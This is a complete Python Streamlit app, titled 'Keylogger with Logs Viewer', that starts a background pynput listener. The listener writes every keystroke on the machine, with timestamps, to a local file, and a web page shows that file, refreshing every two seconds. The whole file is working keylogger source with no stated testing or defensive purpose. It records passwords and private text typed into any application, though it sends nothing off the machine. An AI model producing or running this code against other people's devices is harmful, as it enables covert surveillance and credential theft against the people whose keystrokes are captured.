import streamlit as st
import threading
import time
from pynput import keyboard
from datetime import datetime
from streamlit_autorefresh import st_autorefresh

log_file = "key_log.txt"
logging = False

def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key}\n")

def on_press(key):
    try:
        write_to_log(key.char)
    except AttributeError:
        write_to_log(str(key))

def start_keylogger():
    global logging
    if not logging:
        logging = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

st.title("Keylogger with Logs Viewer")

autorefresh = st_autorefresh(interval=2000, key="refresh")  # refresh every 2 seconds

if st.button("Start Keylogger"):
    threading.Thread(target=start_keylogger, daemon=True).start()
    st.success("Keylogger started")

st.subheader("Logged Keystrokes")
try:
    with open(log_file, "r") as f:
        logs = f.read()
        st.text_area("Keystrokes", logs, height=300)
except FileNotFoundError:
    st.warning("Log file not found.")
